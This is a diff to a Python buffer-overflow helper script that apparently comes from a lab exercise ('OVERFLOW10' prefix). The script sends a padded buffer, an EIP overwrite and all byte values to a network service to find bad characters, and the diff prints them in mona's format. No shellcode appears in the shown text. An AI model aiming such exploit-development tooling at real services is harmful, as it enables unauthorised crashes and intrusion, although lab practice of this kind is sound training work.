@@ -8,16 +8,19 @@ import itertools
 from typing import Optional
 
 def main(ip: str, port: int, eip_offset: int, overflow_threshold: int) -> None:
+	if eip_offset > overflow_threshold:
+		print("The value of the offset cannot be bigger than the overflow threshold")
+		sys.exit(0)
+	
 	# Define prefix and buffer with encoded cyclic pattern
-	prefix = b"OVERFLOW2 "	# CHANGE
+	prefix = b"OVERFLOW10 "	# CHANGE
 	buffer = b"A" * eip_offset
 	eip = b"B" * 4
 	all_characters = bytearray(range(1, 256))
 	bad_characters = [  # CHANGE
-		b'\x07',
-		b'\x2e',
-		b'\x2f',
-		b'\xa0'
+		#b'\x04',
+		#b'\x3e',
+		#b'\xe1'
 	]
 
 	payload = b""
@@ -73,6 +76,9 @@ def main(ip: str, port: int, eip_offset: int, overflow_threshold: int) -> None:
 	except:
 		print("\n","="*25,"CRASH","="*25,"\n")
 		print(f"Application crashed at {len(payload) - len(prefix)} bytes! ({len(bad_characters)} bad characters)" )
+		if len(bad_characters) > 0:
+			hex_string = '\\x'.join('{:02x}'.format(b) for b in b''.join(bad_characters))
+			print(f"For mona: {hex_string}")
 		sys.exit(0)
 
 if __name__ == "__main__":
